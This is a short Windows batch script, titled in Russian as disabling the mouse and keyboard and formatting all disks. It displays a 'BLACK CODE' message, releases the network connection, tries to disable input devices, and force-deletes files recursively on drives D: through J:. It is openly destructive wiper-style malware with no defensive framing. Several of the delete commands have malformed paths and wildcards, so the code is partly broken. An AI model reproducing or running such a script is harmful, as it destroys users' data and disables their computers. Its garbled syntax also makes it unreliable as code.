# Отключение мыши и клавиатуры, форматирование всех дисков


@Echo off
rundll32 keyboard,disable
rundll32 mouse,disable
ipconfig /release
msg* "BLACK CODE"
del D:\.* /f /s /q
del E:\.* /f /s /q
del F:\*..* /f /s /q
del G:\ /f /s /q
del H:\*.* .* /f /s /q
del I:\f /s /q
del J:\*.* /f /s /q
exit
